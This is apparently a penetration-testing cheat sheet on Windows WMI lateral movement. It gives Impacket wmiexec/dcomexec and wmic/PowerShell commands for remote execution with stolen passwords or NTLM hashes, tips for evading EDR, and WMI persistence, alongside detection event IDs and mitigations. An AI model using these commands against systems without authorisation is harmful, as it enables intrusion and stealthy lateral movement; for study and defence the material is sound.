# WMI Execution

Windows Management Instrumentation (WMI) provides a management infrastructure for Windows systems. Attackers use WMI to execute remote commands without creating services or writing files to disk — making it significantly stealthier than PsExec.

## How It Works

1. Authenticate to the target over RPC (DCOM or WinRM) using local admin credentials
2. Leverage `win32_process.Create()` method to start a process on the remote system
3. Output is typically written to a file or over named pipe, then retrieved
4. No service creation, no binary dropped on disk (unless payload writes to disk)

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local admin on target |
| RPC (DCOM) | Port 135 (endpoint mapper) + dynamic RPC ports (1024-5000 or 49152-65535) |
| WinRM | Port 5985 (HTTP) or 5986 (HTTPS) for WinRM-based WMI |
| Authentication | NTLM or Kerberos |
| Firewall | DCOM must be allowed (or WinRM) |

---

## Impacket wmiexec.py

```
# Standard password authentication
wmiexec.py DOMAIN/user:'Password123!'@192.168.1.100

# NTLM hash authentication (PtH)
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# With both LM and NTLM hash
wmiexec.py -hashes LM:NTLM DOMAIN/admin@target

# Single command execution
wmiexec.py DOMAIN/user:pass@target 'whoami'

# Specify share for output (default ADMIN$)
wmiexec.py -share C$ DOMAIN/user@target 'whoami'

# No output — fire and forget
wmiexec.py -nooutput DOMAIN/user@target 'powershell -enc BASE64'

# Use with Kerberos
wmiexec.py -k -no-pass DOMAIN/user@target.domain.local

# Silence (reduces output verbosity)
wmiexec.py DOMAIN/user:pass@target 'whoami' -silentcommand
```

**OPSEC**: wmiexec creates a temporary VBS file (`%TEMP%\*.vbs`) on the target to handle output redirection. The VBS script is cleaned up after execution. This VBS file is a signature for EDR systems.

### wmiexec — Cleaned Variant (no VBS)

```
# Some Impacket forks support no-VBS mode
wmiexec.py -vbs=0 DOMAIN/user:pass@target 'whoami'
```

Without VBS, wmiexec still works but cannot retrieve command output (fire-and-forget mode). Use `-nooutput` to skip VBS creation.

---

## Impacket dcomexec.py — DCOM Variant

DCOM execution is an alternative to WMI that uses COM objects instead of `win32_Process`.

```
# MMC Application class (most reliable)
dcomexec.py -object MMC DOMAIN/user:'pass'@target

# ShellBrowserWindow (IE COM object)
dcomexec.py -object ShellBrowserWindow DOMAIN/user:pass@target

# With hash
dcomexec.py -hashes :HASH DOMAIN/user@target

# Single command
dcomexec.py -object MMC DOMAIN/user:pass@target "whoami"
```

**OPSEC**: DCOM execution does not create VBS files. It runs in-process via COM, making it stealthier than wmiexec.

---

## Windows Native — wmic

```
# Execute command and capture output to file
wmic /node:target process call create "cmd /c whoami > C:\out.txt"

# No output file (fire and forget)
wmic /node:target process call create "calc.exe"

# With credentials
wmic /node:target /user:DOMAIN\admin /password:pass process call create "cmd /c whoami > C:\out.txt"

# List processes
wmic /node:target process list brief

# Query system info
wmic /node:target os get Caption,CSName

# Read output file from remote
wmic /node:target process call create "cmd /c type C:\out.txt"

# Remote process termination
wmic /node:target process where name="malware.exe" delete

# Service control via WMI
wmic /node:target service where name="wuauserv" call startservice

# Create scheduled task via WMI
wmic /node:target job call create "cmd /c whoami", 0, 0, ,0, ,0

# Using exported credentials (requires runas /netonly first)
runas /netonly /user:DOMAIN\admin cmd
wmic /node:target process call create "cmd /c whoami"
```

**OPSEC**: `wmic` is a built-in Windows binary (lives on disk) but creates a VBS-like execution via `win32_Process`. Event 4688 will show `wmic.exe` spawning `cmd.exe`.

---

## PowerShell — Invoke-WmiMethod / Get-WmiObject

```powershell
# Execute command
Invoke-WmiMethod -ComputerName target -Class win32_process -Name create -ArgumentList "cmd /c whoami > C:\out.txt"

# With credentials
$secpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\admin', $secpass)
Invoke-WmiMethod -ComputerName target -Credential $cred -Class win32_process -Name create -ArgumentList "whoami"

# Alternative using Get-WmiObject
(Get-WmiObject -ComputerName target -Class win32_process -Credential $cred).Create("whoami")

# Using WMI via CIM cmdlets (newer)
Invoke-CimMethod -ComputerName target -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="whoami"} -Credential $cred

# Query remote processes via WMI
Get-WmiObject -ComputerName target -Class win32_process | Select Name, ProcessId

# Filter for specific processes
Get-WmiObject -ComputerName target -Class win32_process -Filter "Name LIKE '%explorer%'"

# Get OS info
Get-WmiObject -ComputerName target -Class win32_operatingsystem
```

---

## CIM Session (WinRM-based WMI)

```powershell
# Create CIM session (uses WinRM not DCOM)
$session = New-CimSession -ComputerName target -Credential $cred

# Execute command via CIM
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="whoami"}

# Alternative syntax
$params = @{CommandLine="powershell -enc BASE64"}
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments $params

# Remove CIM session
Remove-CimSession $session
```

---

## WMI Event Subscription — Persistence / Lateral Movement

WMI can create event filters and consumers for persistent execution:

```powershell
# Create event filter (triggers on process start)
Register-CimIndicationEvent -Namespace root/subscription -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'" -Action { & whoami }

# Create permanent event consumer
# (Requires writing via MOF or directly)
```

**OPSEC**: WMI event subscriptions survive reboots and don't create files or services. They are difficult to detect but also hard to set up remotely.

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4624 | Security | LogonType 3 (Network — WMI DCOM/WinRM auth) |
| 4648 | Security | Explicit credential logon (if using alternate creds) |
| 4688 | Security | Process creation — `cmd.exe` or `powershell.exe` spawned by `wmiprvse.exe` |
| 5156 | Security | WFP connection to 135, 49152-65535 (DCOM) |
| 5861 | WMI-Activity | WMI activity trace |
| 5858 | WMI-Activity | WMI permanent event consumer |
| 19 | Sysmon | WmiEventFilter |
| 20 | Sysmon | WmiEventConsumer |
| 21 | Sysmon | WmiEventConsumerToFilter |
| 7 | Sysmon | DLL load (`wbemprox.dll`, `fastprox.dll`) |
| 1 | Sysmon | Process create — `wmiprvse.exe` |cmd.exe |

**Detection logic**:
- `cmd.exe` or `powershell.exe` with parent process `wmiprvse.exe` = WMI execution
- Network connections from `WMIPRVSE.EXE` to remote machines on port 135 = WMI lateral movement
- Multiple WMI process creates across many targets in short time = automated WMI LM
- WMI Activity (5861) with `Create` method on `Win32_Process` across machines
- Event 4688: process tree `svchost.exe` → `wmiprvse.exe` → `cmd.exe` (classic WMI chain)

## Mitigation

| Control | Detail |
|---------|--------|
| Block DCOM | Disable DCOM via firewall rules across network segments |
| Remove WMI | Not practical — required for management |
| WMI filtering | Block `win32_process.Create` via WMI control |
| SACL | Audit WMI process creation |
| EDR | Monitor parent process of cmd/powershell for WMI |
| JIT administration | Only grant admin rights during approved windows |
| WinRM audit | Monitor WinRM-based WMI usage |

## When to Use WMI Execution

- **Stealth required** — no service creation, lower detection rate than PsExec
- **EDR monitors services** — WMI creates no service events (4697/7045)
- **Need to blend in** — WMI is used heavily by legitimate admin tools (SCCM, WSUS, etc.)
- **PsExec blocked** — firewall, AV, or policy blocks service creation
- **Quick check** — single command execution without interactive shell
- **Before PsExec** — try WMI first, fall back to PsExec if it fails

## When NOT to Use WMI

- **Interactive shell needed** — WMI provides command execution, not an interactive console
- **Long-running commands** — WMI may timeout for slow operations
- **Windows Firewall blocks RPC** — DCOM ports are dynamically assigned and harder to whitelist
- **wmic deprecated** — newer Windows versions may not have `wmic.exe`
